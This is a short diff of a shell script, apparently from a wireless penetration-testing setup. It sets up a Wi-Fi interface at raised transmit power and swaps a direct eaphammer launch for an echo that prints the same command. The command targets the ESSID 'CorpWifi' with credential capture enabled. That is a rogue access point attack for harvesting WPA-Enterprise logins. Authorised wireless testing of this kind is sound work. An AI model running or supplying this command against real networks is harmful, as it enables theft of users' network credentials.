@@ -18,5 +18,4 @@ sudo iw $interface set txpower fixed 3000
 sudo iw dev $interface set type managed
 sudo ip link set $interface up
 
-cd /opt/eaphammer
-/opt/eaphammer/eaphammer -i $interface --channel 4 --auth wpa-eap --essid CorpWifi --creds
+echo "adjust to needs and run: /opt/eaphammer/eaphammer -i wlan0 --channel 4 --auth wpa-eap --essid CorpWifi --creds"
